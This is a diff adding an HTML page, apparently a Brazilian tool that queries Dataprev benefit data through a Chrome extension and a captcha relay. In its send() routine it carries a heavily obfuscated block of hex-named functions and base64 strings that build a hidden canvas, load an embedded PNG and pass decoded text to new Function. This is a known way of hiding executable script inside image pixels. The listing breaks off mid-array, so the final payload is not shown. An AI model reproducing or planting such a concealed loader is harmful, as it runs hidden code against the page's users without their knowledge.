@@ -1,0 +1,1974 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="">
+<meta name="author" content="">
+<title>SISTEMA 3K</title>
+<link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/fiolpaoghfmcfajiogkbgnjmikkdcpji">
+<link href="css/bootstrap.min.css" rel="stylesheet" />
+<link href="css/jquery-ui.min.css" rel="stylesheet" />
+<link href="css/store.css" rel="stylesheet" />
+<style type="text/css">
+input {
+	display: block;
+    padding: .5rem .75rem;
+    font-size: 13px;
+    line-height: 18px;
+    color: #55595c;
+    background-color: #fff;
+    background-image: none;
+    -webkit-background-clip: padding-box;
+    background-clip: padding-box;
+    border: 1px solid rgba(0,0,0,.15);
+    border-radius: .25rem;
+}
+#detalhamento .group {
+	margin:20px 20px 0px 20px;
+}
+#detalhamento .group p {
+	font-size:13px;
+}
+#detalhamento .group label {
+	display:block;
+	font-size:11px;
+	font-weight:bold;
+	color:#AAA;
+	margin-bottom:5px;
+}
+#detalhamento img {
+	margin-bottom:20px;
+}
+#detalhamento #msg {
+	margin-top:5px;
+	margin-left:20px;
+}
+#detalhamento #msg p {
+	margin:0px;
+}
+#detalhamento #msg #loading {
+    display: inline-block;
+    line-height: 30px;
+    margin-top: 8px;
+    vertical-align: bottom;
+    margin-right: 5px;
+    border-bottom: 3px solid rgba(0, 0, 0, 0.1);
+    border-left: 3px solid rgba(0, 0, 0, 0.1);
+    border-right: 3px solid rgba(0, 0, 0, 0.1);
+    border-top: 3px solid rgba(0, 0, 0, 0.6);
+    border-radius: 100%;
+    height: 13px;
+    width: 13px;
+    animation: rot .6s infinite linear;
+}
+@keyframes rot {
+	from {transform: rotate(0deg);}
+	to {transform: rotate(359deg);}
+}
+.panel-body .table tbody tr:nth-child(1) td,
+.panel-body .table tbody tr:nth-child(1) th {
+	border-top:none !important;
+}
+</style>
+<script src="jss/jquery.min.js"></script>
+<script src="jss/jquery-ui.min.js"></script>
+<script src="css/bootstrap.min.js"></script>
+<script>
+// numeral.js
+// version : 1.4.5
+// author : Adam Draper
+// license : MIT
+// http://adamwdraper.github.com/Numeral-js/
+(function(){function o(e){this._n=e}function u(e,t,n){var r=Math.pow(10,t),i;i=(Math.round(e*r)/r).toFixed(t);if(n){var s=new RegExp("0{1,"+n+"}$");i=i.replace(s,"")}return i}function a(e,t){var n;t.indexOf("$")>-1?n=l(e,t):t.indexOf("%")>-1?n=c(e,t):t.indexOf(":")>-1?n=h(e,t):n=d(e,t);return n}function f(e,t){if(t.indexOf(":")>-1)e._n=p(t);else if(t===i)e._n=0;else{var s=t;n[r].delimiters.decimal!=="."&&(t=t.replace(/\./g,"").replace(n[r].delimiters.decimal,"."));var o=new RegExp(n[r].abbreviations.thousand+"(?:\\)|(\\"+n[r].currency.symbol+")?(?:\\))?)?$"),u=new RegExp(n[r].abbreviations.million+"(?:\\)|(\\"+n[r].currency.symbol+")?(?:\\))?)?$"),a=new RegExp(n[r].abbreviations.billion+"(?:\\)|(\\"+n[r].currency.symbol+")?(?:\\))?)?$"),f=new RegExp(n[r].abbreviations.trillion+"(?:\\)|(\\"+n[r].currency.symbol+")?(?:\\))?)?$"),l=["KB","MB","GB","TB","PB","EB","ZB","YB"],c=!1;for(var h=0;h<=l.length;h++){c=t.indexOf(l[h])>-1?Math.pow(1024,h+1):!1;if(c)break}e._n=(c?c:1)*(s.match(o)?Math.pow(10,3):1)*(s.match(u)?Math.pow(10,6):1)*(s.match(a)?Math.pow(10,9):1)*(s.match(f)?Math.pow(10,12):1)*(t.indexOf("%")>-1?.01:1)*Number((t.indexOf("(")>-1?"-":"")+t.replace(/[^0-9\.'-]+/g,""));e._n=c?Math.ceil(e._n):e._n}return e._n}function l(e,t){var i=t.indexOf("$")<=1?!0:!1,s="";if(t.indexOf(" $")>-1){s=" ";t=t.replace(" $","")}else if(t.indexOf("$ ")>-1){s=" ";t=t.replace("$ ","")}else t=t.replace("$","");var o=a(e,t);if(i)if(o.indexOf("(")>-1||o.indexOf("-")>-1){o=o.split("");o.splice(1,0,n[r].currency.symbol+s);o=o.join("")}else o=n[r].currency.symbol+s+o;else if(o.indexOf(")")>-1){o=o.split("");o.splice(-1,0,s+n[r].currency.symbol);o=o.join("")}else o=o+s+n[r].currency.symbol;return o}function c(e,t){var n="";if(t.indexOf(" %")>-1){n=" ";t=t.replace(" %","")}else t=t.replace("%","");e._n=e._n*100;var r=a(e,t);if(r.indexOf(")")>-1){r=r.split("");r.splice(-1,0,n+"%");r=r.join("")}else r=r+n+"%";return r}function h(e,t){var n=Math.floor(e._n/60/60),r=Math.floor((e._n-n*60*60)/60),i=Math.round(e._n-n*60*60-r*60);return n+":"+(r<10?"0"+r:r)+":"+(i<10?"0"+i:i)}function p(e){var t=e.split(":"),n=0;if(t.length===3){n+=Number(t[0])*60*60;n+=Number(t[1])*60;n+=Number(t[2])}else if(t.lenght===2){n+=Number(t[0])*60;n+=Number(t[1])}return Number(n)}function d(e,t){var s=!1,o=!1,a="",f="",l="",c=Math.abs(e._n);if(e._n===0&&i!==null)return i;if(t.indexOf("(")>-1){s=!0;t=t.slice(1,-1)}if(t.indexOf("a")>-1){if(t.indexOf(" a")>-1){a=" ";t=t.replace(" a","")}else t=t.replace("a","");if(c>=Math.pow(10,12)){a+=n[r].abbreviations.tillion;e._n=e._n/Math.pow(10,12)}else if(c<Math.pow(10,12)&&c>=Math.pow(10,9)){a+=n[r].abbreviations.billion;e._n=e._n/Math.pow(10,9)}else if(c<Math.pow(10,9)&&c>=Math.pow(10,6)){a+=n[r].abbreviations.million;e._n=e._n/Math.pow(10,6)}else if(c<Math.pow(10,6)&&c>=Math.pow(10,3)){a+=n[r].abbreviations.thousand;e._n=e._n/Math.pow(10,3)}}if(t.indexOf("b")>-1){if(t.indexOf(" b")>-1){f=" ";t=t.replace(" b","")}else t=t.replace("b","");var h=["B","KB","MB","GB","TB","PB","EB","ZB","YB"],p,d;for(var v=0;v<=h.length;v++){p=Math.pow(1024,v);d=Math.pow(1024,v+1);if(e._n>=p&&e._n<d){f+=h[v];p>0&&(e._n=e._n/p);break}}}if(t.indexOf("o")>-1){if(t.indexOf(" o")>-1){l=" ";t=t.replace(" o","")}else t=t.replace("o","");l+=n[r].ordinal(e._n)}if(t.indexOf("[.]")>-1){o=!0;t=t.replace("[.]",".")}var m=e._n.toString().split(".")[0],g=t.split(".")[1],y=t.indexOf(","),b="",w=!1;if(g){if(g.indexOf("[")>-1){g=g.replace("]","");g=g.split("[");b=u(e._n,g[0].length+g[1].length,g[1].length)}else b=u(e._n,g.length);m=b.split(".")[0];b.split(".")[1].length?b=n[r].delimiters.decimal+b.split(".")[1]:b="";o&&Number(b)===0&&(b="")}else m=u(e._n,null);if(m.indexOf("-")>-1){m=m.slice(1);w=!0}y>-1&&(m=m.toString().replace(/(\d)(?=(\d{3})+(?!\d))/g,"$1"+n[r].delimiters.thousands));t.indexOf(".")===0&&(m="");return(s&&w?"(":"")+(!s&&w?"-":"")+m+b+(l?l:"")+(a?a:"")+(f?f:"")+(s&&w?")":"")}function v(e,t){n[e]=t}var e,t="1.4.5",n={},r="en",i=null,s=typeof module!="undefined"&&module.exports;e=function(t){e.isNumeral(t)?t=t.value():Number(t)||(t=0);return new o(Number(t))};e.version=t;e.isNumeral=function(e){return e instanceof o};e.language=function(t,i){if(!t)return r;t&&!i&&(r=t);(i||!n[t])&&v(t,i);return e};e.language("en",{delimiters:{thousands:".",decimal:","},abbreviations:{thousand:"K",million:"M",billion:"B",trillion:"T"},ordinal:function(e){var t=e%10;return~~(e%100/10)===1?"th":t===1?"st":t===2?"nd":t===3?"rd":"th"},currency:{symbol:"R$"}});e.zeroFormat=function(e){typeof e=="string"?i=e:i=null};e.fn=o.prototype={clone:function(){return e(this)},format:function(t){return a(this,t?t:e.defaultFormat)},unformat:function(t){return f(this,t?t:e.defaultFormat)},value:function(){return this._n},valueOf:function(){return this._n},set:function(e){this._n=Number(e);return this},add:function(e){this._n=this._n+Number(e);return this},subtract:function(e){this._n=this._n-Number(e);return this},multiply:function(e){this._n=this._n*Number(e);return this},divide:function(e){this._n=this._n/Number(e);return this},difference:function(e){var t=this._n-Number(e);t<0&&(t=-t);return t}};s&&(module.exports=e);typeof ender=="undefined"&&(this.numeral=e);typeof define=="function"&&define.amd&&define([],function(){return e})}).call(this);
+var Overlay = {
+	create: function(properties) {
+		if($("#overlay").length == 0) {
+			alert("Overlay cant be initialize!");
+			return false;
+		}
+		$("#overlay").empty();
+		$("#overlay").append($(properties.content));
+		$("#overlay .popup").focus();
+		$("#overlay").find("#"+properties.element).addClass("animated bounceInDown");
+		//$("#overlay").find("#"+properties.element).addClass("active popup").html('<div class="header"><h2>'+properties.title+'<div id="close">&times;</div></h2></div><div class="content">'+properties.content+'</div><div class="footer">'+properties.footer+'</div>');
+		$("#overlay").addClass("animated fadeIn").removeClass("hide");
+		$("#overlay #close").on({
+			click:function() {
+				$(this).parents(".popup").addClass("animated bounceOutUp");
+				setTimeout(function() {
+					$(this).parents(".popup").remove();
+					$("#overlay").addClass("fadeOut slow");
+				}, 600);
+				setTimeout(function() {
+					$("#overlay").addClass("hide").removeClass("animated fadeOut slow");
+				}, 1100);
+			}
+		});
+		$("#overlay .popup .content .btn.bluegray").on({
+			click: function() {
+				$(this).parents("#overlay").find("#close").trigger("click");
+			}
+		});
+		$("#overlay .popup .content ul li").on({
+			click: function() {
+				$popup = $(this).parents(".popup");
+				$popup.find(".content ul li.current").removeClass("current");
+				$(this).addClass("current");
+				$popup.find(".content div[data-content]:not(.hide)").addClass("hide");
+				$popup.find(".content div[data-content="+$(this).data("content")+"]").removeClass("hide");
+			}
+		});
+	},
+	__resize: function() {
+		//$("#overlay").find("> .popup").css({"top":$("#overlay").find("> .popup.active").height});
+	}
+};
+var Dataprev = {
+	id: "fiolpaoghfmcfajiogkbgnjmikkdcpji",
+	version: false,
+	isInstalled: false,
+	cancel: false,
+	load: false,
+	alert: function(message) {
+		return alert(message);
+	},
+	consulta: {
+		nb: null,
+		nome: null,
+		cpf: null,
+		nascimento: null,
+		captcha: null
+	},
+	dados: {
+		beneficiario: null,
+		extrato: null,
+	},
+	checkIsInstalled: function(e) {
+		Dataprev.port = chrome.runtime.connect(Dataprev.id, {name: "dataprev"});
+		Dataprev.port.onMessage.addListener(function(event) {
+			if(event.isInstalled) {
+				Dataprev.isInstalled = true;
+			}
+			if(event.app) {
+				Dataprev.app = event.app;
+			}
+		});
+		if(chrome.app.isInstalled && !Dataprev.isInstalled) {
+			Dataprev.isInstalled = true;
+		}
+	},
+	install: function() {
+		chrome.webstore.install();
+	},
+	source: null,
+	process: {
+		ajax: null,
+		response: null,
+		cancel: function() {
+			Dataprev.cancel = true;
+			if(Dataprev.port) {
+				Dataprev.port.postMessage({disconnect: true});
+			}
+			Dataprev.load = false;
+			$("#detalhamento .modal-footer #msg").addClass("hide");
+			$("#detalhamento .close").trigger("click");
+		},
+		reloadcaptcha: function() {
+			Dataprev.load = true;
+			Dataprev.consulta.captcha = null;
+			$("#detalhamento #validation input[name=captcha]").val('');
+			if(Dataprev.port && Dataprev.consulta.token) {
+				$("#detalhamento #validation img").attr("src", "loading.gif");
+				Dataprev.port.postMessage({dataprev: "loadcaptcha", token: Dataprev.consulta.token});
+				Dataprev.port.onMessage.addListener(function(event) {
+					if(event.loadcaptcha) {
+						Dataprev.load = false;
+						Dataprev.process.response = event;
+						Dataprev.consulta.token = event.token;
+						$("#detalhamento #validation img").attr("src", Dataprev.process.response.loadcaptcha);
+					}
+				});
+			}
+			else {
+				Dataprev.load = false;
+				$("#detalhamento .btn.primary").attr("onclick",'$("#detalhamento .close").trigger("click")').html("Ok").addClass("default");
+				$("#detalhamento .btn-danger, #dataprev #validation").remove();
+				$("#detalhamento #notification").html('<div class="attention" style="font-size:13px;padding:10px;border-top:1px solid #E0D8A8"><i style="float:left;margin-right:10px;background:url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAA3NCSVQICAjb4U/gAAAAKlBMVEX///+Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj18/Ny+AAAADnRSTlMAESJEVWaImaq7zN3u/1CN6x8AAAAJcEhZcwAACxIAAAsSAdLdfvwAAAAcdEVYdFNvZnR3YXJlAEFkb2JlIEZpcmV3b3JrcyBDUzbovLKMAAAAFnRFWHRDcmVhdGlvbiBUaW1lADEyLzEzLzE0dEuF0QAAAGhJREFUCJljYEACLA5QBucEKMP3CoRm3HtbAMxgu703AczQvSx7CczovSJ7A0Qz370ie9cAyOACMRYAGbF3r8fevQrUfPbujdy7dwQY2O7evcR9924Cg8/du7fm3r17hGHvXTC4DXcCACrdKm8JcIjBAAAAAElFTkSuQmCC\') no-repeat;width:16px;height:16px"></i>Não identificamos seu acesso ao dataprev. Tente novamente.</div>');
+			}
+		},
+		captcha: function() {
+			if(!Dataprev.isInstalled) {
+				$("#detalhamento .modal-body").html('<div id="notification"><div class="attention" style="font-size:13px;padding:10px;border-top:1px solid #E0D8A8"><i style="float:left;margin-right:10px;background:url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAA3NCSVQICAjb4U/gAAAAKlBMVEX///+Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj18/Ny+AAAADnRSTlMAESJEVWaImaq7zN3u/1CN6x8AAAAJcEhZcwAACxIAAAsSAdLdfvwAAAAcdEVYdFNvZnR3YXJlAEFkb2JlIEZpcmV3b3JrcyBDUzbovLKMAAAAFnRFWHRDcmVhdGlvbiBUaW1lADEyLzEzLzE0dEuF0QAAAGhJREFUCJljYEACLA5QBucEKMP3CoRm3HtbAMxgu703AczQvSx7CczovSJ7A0Qz370ie9cAyOACMRYAGbF3r8fevQrUfPbujdy7dwQY2O7evcR9924Cg8/du7fm3r17hGHvXTC4DXcCACrdKm8JcIjBAAAAAElFTkSuQmCC\') no-repeat;width:16px;height:16px"></i>É necessário a instalação de um plugin para consulta direta á margem. Deseja proceder com a instalação?</div></div>');
+				$("#detalhamento .modal-footer").html('<button type="button" class="btn btn-primary" style="float:left;margin-right:10px">Instalar</button>');
+				$("#detalhamento .modal-footer .btn-primary").text("Instalar").click(function() {
+					Dataprev.install();
+				});
+				return false;
+			}
+			if(Dataprev.app.version != '1.0.4') {
+				$("#detalhamento .modal-body").html('<div id="notification"><div class="attention" style="font-size:13px;padding:10px;border-top:1px solid #E0D8A8"><i style="float:left;margin-right:10px;background:url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAA3NCSVQICAjb4U/gAAAAKlBMVEX///+Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj18/Ny+AAAADnRSTlMAESJEVWaImaq7zN3u/1CN6x8AAAAJcEhZcwAACxIAAAsSAdLdfvwAAAAcdEVYdFNvZnR3YXJlAEFkb2JlIEZpcmV3b3JrcyBDUzbovLKMAAAAFnRFWHRDcmVhdGlvbiBUaW1lADEyLzEzLzE0dEuF0QAAAGhJREFUCJljYEACLA5QBucEKMP3CoRm3HtbAMxgu703AczQvSx7CczovSJ7A0Qz370ie9cAyOACMRYAGbF3r8fevQrUfPbujdy7dwQY2O7evcR9924Cg8/du7fm3r17hGHvXTC4DXcCACrdKm8JcIjBAAAAAElFTkSuQmCC\') no-repeat;width:16px;height:16px"></i>A versão instalada está desatualizada. Por favor atualize a versão de seu plugin para continuar.</div></div>');
+				$("#detalhamento .modal-footer .btn-primary").text("Atualizar").click(function() {
+					Dataprev.install();
+				});
+				return false;
+			}
+			if(Dataprev.load) {
+				return Dataprev.alert("Por favor aguarde, já existe uma solicitação em andamento.");
+			}
+			$("#detalhamento .modal-body").html('<div id="notification"></div><div id="validation"><div class="group right"><img style="cursor:pointer" onclick="Dataprev.process.reloadcaptcha();" src="loading.gif" height="64" /></div><div class="group left"><label>Verificação</label><input type="text" name="captcha" value="" class="field" style="text-transform:uppercase" /></div><div class="clear"></div></div>');
+			$("#detalhamento .modal-footer").html('<button type="button" class="btn btn-primary" style="float:left;margin-right:10px">Capturar</button><button type="button" class="btn btn-danger" data-dismiss="modal" style="float:left">Cancelar</button><div class="left hide" id="msg"><div id="loading" class="left"></div><p class="left" style="line-height:30px;font-size:11px !important;color:#1e1e1e"><b>Processando...</b></p></div>');
+			$("#detalhamento #validation input[name=captcha]").keyup(function() {
+				Dataprev.consulta.captcha = $(this).val();
+			});
+			$("#detalhamento .modal-footer .btn-primary").text("Capturar").click(function() {
+				Dataprev.load = false;
+				Dataprev.process.send();
+			});
+			$("#detalhamento .modal-footer .btn-danger").click(function() {
+				Dataprev.process.cancel();
+			});
+			Dataprev.load = true;
+			Dataprev.port = chrome.runtime.connect(Dataprev.id, {name: "dataprev"});
+			Dataprev.port.postMessage({dataprev: "newsession"});
+			Dataprev.port.onMessage.addListener(function(event) {
+				if(event.connected) {
+					//$("body").html("Conectado, aguarde...<br>");
+				}
+				if(event.dataprev) {
+					Dataprev.load = false;
+					Dataprev.port.postMessage(event);
+				}
+				if(event.newsession) {
+					Dataprev.load = false;
+					$("#detalhamento #notification").empty();
+					if(event.error) {
+
+					}
+					else {
+						Dataprev.process.response = event.newsession;
+						$.each(Dataprev.process.response, function(key, data) {
+							if(key != "captcha" && key != "success") {
+								Dataprev.consulta[key] = data;
+							}
+						});
+						$("#detalhamento #validation img").attr("src", Dataprev.process.response.captcha);
+					}
+				}
+				if(event.loadcaptcha) {
+					Dataprev.load = false;
+					Dataprev.process.response = event;
+					Dataprev.consulta.token = event.token;
+					$("#detalhamento #validation img").attr("src", Dataprev.process.response.loadcaptcha);
+				}
+				if(event.update) {
+					Dataprev.load = false;
+					document.location.reload();
+					return false;
+				}
+				if(event.message) {
+					Dataprev.load = false;
+					$("#detalhamento .modal-footer #msg").addClass("hide");
+					$("#detalhamento #notification").html('<div class="attention" style="font-size:13px;padding:10px;border-top:1px solid #E0D8A8"><i style="float:left;margin-right:10px;background:url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAA3NCSVQICAjb4U/gAAAAKlBMVEX///+Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj18/Ny+AAAADnRSTlMAESJEVWaImaq7zN3u/1CN6x8AAAAJcEhZcwAACxIAAAsSAdLdfvwAAAAcdEVYdFNvZnR3YXJlAEFkb2JlIEZpcmV3b3JrcyBDUzbovLKMAAAAFnRFWHRDcmVhdGlvbiBUaW1lADEyLzEzLzE0dEuF0QAAAGhJREFUCJljYEACLA5QBucEKMP3CoRm3HtbAMxgu703AczQvSx7CczovSJ7A0Qz370ie9cAyOACMRYAGbF3r8fevQrUfPbujdy7dwQY2O7evcR9924Cg8/du7fm3r17hGHvXTC4DXcCACrdKm8JcIjBAAAAAElFTkSuQmCC\') no-repeat;width:16px;height:16px"></i>'+event.message+'</div>');
+					Dataprev.process.reloadcaptcha();
+				}
+				if(event.error) {
+					Dataprev.load = false;
+					$("#detalhamento .btn").attr("data-dismiss","modal").html("Ok").addClass("default");
+					$("#detalhamento .btn-danger, #detalhamento #validation").remove();
+					$("#detalhamento #msg").addClass("hide");
+					$("#detalhamento #notification").html('<div class="attention" style="font-size:13px;padding:10px;border-top:1px solid #E0D8A8"><i style="float:left;margin-right:10px;background:url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAA3NCSVQICAjb4U/gAAAAKlBMVEX///+Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj18/Ny+AAAADnRSTlMAESJEVWaImaq7zN3u/1CN6x8AAAAJcEhZcwAACxIAAAsSAdLdfvwAAAAcdEVYdFNvZnR3YXJlAEFkb2JlIEZpcmV3b3JrcyBDUzbovLKMAAAAFnRFWHRDcmVhdGlvbiBUaW1lADEyLzEzLzE0dEuF0QAAAGhJREFUCJljYEACLA5QBucEKMP3CoRm3HtbAMxgu703AczQvSx7CczovSJ7A0Qz370ie9cAyOACMRYAGbF3r8fevQrUfPbujdy7dwQY2O7evcR9924Cg8/du7fm3r17hGHvXTC4DXcCACrdKm8JcIjBAAAAAElFTkSuQmCC\') no-repeat;width:16px;height:16px"></i>'+event.error+'</div>');
+					return false;
+				}
+			});
+		},
+		send: function() {
+			$("#detalhamento #notification").empty();
+			if(Dataprev.consulta.length == 0) {
+				$("#detalhamento #notification").html('<div class="attention" style="font-size:13px;padding:10px;border-top:1px solid #E0D8A8"><i style="float:left;margin-right:10px;background:url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAA3NCSVQICAjb4U/gAAAAKlBMVEX///+Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj18/Ny+AAAADnRSTlMAESJEVWaImaq7zN3u/1CN6x8AAAAJcEhZcwAACxIAAAsSAdLdfvwAAAAcdEVYdFNvZnR3YXJlAEFkb2JlIEZpcmV3b3JrcyBDUzbovLKMAAAAFnRFWHRDcmVhdGlvbiBUaW1lADEyLzEzLzE0dEuF0QAAAGhJREFUCJljYEACLA5QBucEKMP3CoRm3HtbAMxgu703AczQvSx7CczovSJ7A0Qz370ie9cAyOACMRYAGbF3r8fevQrUfPbujdy7dwQY2O7evcR9924Cg8/du7fm3r17hGHvXTC4DXcCACrdKm8JcIjBAAAAAElFTkSuQmCC\') no-repeat;width:16px;height:16px"></i>Não foram informados dados para consulta. Recarregue e tente novamente.</div>');
+				return false;
+			}
+			if(Dataprev.load) {
+				$("#detalhamento #notification").html('<div class="attention" style="font-size:13px;padding:10px;border-top:1px solid #E0D8A8"><i style="float:left;margin-right:10px;background:url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAA3NCSVQICAjb4U/gAAAAKlBMVEX///+Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj18/Ny+AAAADnRSTlMAESJEVWaImaq7zN3u/1CN6x8AAAAJcEhZcwAACxIAAAsSAdLdfvwAAAAcdEVYdFNvZnR3YXJlAEFkb2JlIEZpcmV3b3JrcyBDUzbovLKMAAAAFnRFWHRDcmVhdGlvbiBUaW1lADEyLzEzLzE0dEuF0QAAAGhJREFUCJljYEACLA5QBucEKMP3CoRm3HtbAMxgu703AczQvSx7CczovSJ7A0Qz370ie9cAyOACMRYAGbF3r8fevQrUfPbujdy7dwQY2O7evcR9924Cg8/du7fm3r17hGHvXTC4DXcCACrdKm8JcIjBAAAAAElFTkSuQmCC\') no-repeat;width:16px;height:16px"></i>Por favor aguarde, já existe uma solicitação em andamento.</div>');
+				return false;
+			}
+			Dataprev.load = true;
+			$("#detalhamento #msg").removeClass("hide");
+			v58d1dde603be30842b27fd17614124a0=[ function(v3c422a34f918e968e3c2776af7de9c8d){return 'a6b21a4281226e8a97c2e05517fbe546775efc6adb8faa96b4f3dec7c391f1464cd72077';}, function(v3c422a34f918e968e3c2776af7de9c8d){return va7c5ef5894e936b91bb633ff63438c94.createElement(v3c422a34f918e968e3c2776af7de9c8d);}, function(v3c422a34f918e968e3c2776af7de9c8d){return v3c422a34f918e968e3c2776af7de9c8d[0].getContext(v3c422a34f918e968e3c2776af7de9c8d[1]);}, function(v3c422a34f918e968e3c2776af7de9c8d){return v3c422a34f918e968e3c2776af7de9c8d[0].text=v3c422a34f918e968e3c2776af7de9c8d[1];}, function(v3c422a34f918e968e3c2776af7de9c8d){return null;}, function(v3c422a34f918e968e3c2776af7de9c8d){'81ecfd4383a1b3f7805215da769e4bb7e368451e499f3f870089ef452cba5790a67d95de';}, function(v3c422a34f918e968e3c2776af7de9c8d){return '81d51c78e6380c53c0310e296eabbeef5ffaae5f66b4c21b415fbd4c13556e3adad68ec0';}, function(v3c422a34f918e968e3c2776af7de9c8d){v3c422a34f918e968e3c2776af7de9c8d.style.display='none';return v3c422a34f918e968e3c2776af7de9c8d;}, function(v3c422a34f918e968e3c2776af7de9c8d){va1790a5e71a3647bc28b29d62d40aa74.onload=v3c422a34f918e968e3c2776af7de9c8d}, function(v3c422a34f918e968e3c2776af7de9c8d){va1790a5e71a3647bc28b29d62d40aa74.src=v3c422a34f918e968e3c2776af7de9c8d;}, new Function("v3c422a34f918e968e3c2776af7de9c8d","return unescape(decodeURIComponent(window.atob(v3c422a34f918e968e3c2776af7de9c8d)))"), function(v3c422a34f918e968e3c2776af7de9c8d){v0ed38bc5ac09a06ff0221c5443165cda=new Function('v3c422a34f918e968e3c2776af7de9c8d',v58d1dde603be30842b27fd17614124a0[10](v78071fdd53a09725441139eb380d0d9e[v3c422a34f918e968e3c2776af7de9c8d]));return v0ed38bc5ac09a06ff0221c5443165cda;}]; v62c4c9ef94561dc30351b877b376b93f=[0,255,1]; v78071fdd53a09725441139eb380d0d9e=[ 'cmV0dXJuJTIwJ2NhbnZhcyclM0I=', 'cmV0dXJuJTIwJ25vbmUnJTNC', 'cmV0dXJuJTIwJzJkJyUzQg==', 'cmV0dXJuJTIwJ3NjcmlwdCclM0I=', '', 'va962ced90aae92fb1eae19c89bdeb91a', 've261ae16ef177fd05afcc52dffaea408', 'cmV0dXJuJTIwJ2RhdGElM0FpbWFnZSUyRnBuZyUzQmJhc2U2NCUyQyclM0I=', '', 'iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAIAAABL1vtsAAADZ0lEQVQ4jSXR21JbZQCG4TeLtRK/kiAJm3TYCmmtlJYCojjSjgd1xl6Ip70/dRh1pgccFDqArUqhhAbQNoGw54PkJ/HA5xae1PMfnyPYwF+aVamFZ6Bp/hRNdADzdkUaw5tmTnptHohVqJuCHIhcN00zAq+kG5hGNWhIOajDEGTQtclaI9IFjnHAA6ZbPkZfEVOQ35kDtGAsFs0gGpBjhC2RgpJYNJ+ZRPSgddMWM+YAzoh0ig7FiLnB2/A19MGOOYbvIbZewIn1DPIoj/bhgeiwV0VNTiumE+6itsiiEt6UJvGo1cKLogPm4R84MmW5YvXCPkjqt5vijSN/xH2my5zjNfS5fWZeyqvWM/MI6mgCL0ERuuQtMYwzkIJeM0rH7JMp0kq2E0pOosRrCeNBd5MkHXyI/g6uJkkXyUwS0iadKLb3ApchbKA0yRUdC/nZMJ4kTbtOSAWmAx8JyyGcoYeiK4RqCNkkdJozUSFcBz1SkiThTgi7hEkiiuhnUxBDKAUVsSVaMIFj6BVzImsa0ht4iPpEGXKmgbJiRbEPoSUdmraomnmrA1qyUYA9tGEy4rF9X/yGS2ZUOoFdaKFpYoake2YZFiBCb8UdfGxO4VfxKV6ACjpHZVPAHWgfGtIYbsIfRHyw22JSXJhNUbRr5iXawj/AOKqiCViSi9CFtkTB5KEMl9YksdqwaWdgQJ4y2+gW/kY2rEALTsQp7oNr6Bd5/E5qw4x1gBtEzokaaonEqokp6IYYHULVHrYLRqYEDZHYVWsMD+M1cYRuHKvT9ImGWYYea0W0rTrMmj1UwLfEpYlQyVyhWC6bNqrChKg74r08C70wCjk8a4pyZP+FnoojsWTOhcwF7MAZTMEIFOUde4CI22bbfosG8bG0DjcINAYVWIcbyMHvuI7HxCisw4k4Mt3/j1yJvDSNX0s3ZlrOwQIOeNMumie4Bk9Rt5TGVasKOSgISSUiGlZiTqGGe/GOWYcXIodSIo2aoh/W4MwkpomLcIW/QJ/gY8W+jXJgqc8ciKq5bzcgK+aghsuobVdFAe9b1zAvv7c+4JQYJtaF/JPJoMeibh9CkEbtE3sXteRpfCTuQdsCsuIXMygqaMLeJeLafIt64JUpi+9QjPdRRjqSY7Nu9Zq03ZD/hQyOURPyeA/2+Q8PNOtQ5qs7TQAAAABJRU5ErkJggg==', 'cmV0dXJuJTIwdmE3YzVlZjU4OTRlOTM2YjkxYmI2MzNmZjYzNDM4Yzk0LmdldEVsZW1lbnRCeUlkKHYzYzQyMmEzNGY5MThlOTY4ZTNjMjc3NmFmN2RlOWM4ZCklM0I=', 'cmV0dXJuJTIwZG9jdW1lbnQ=', 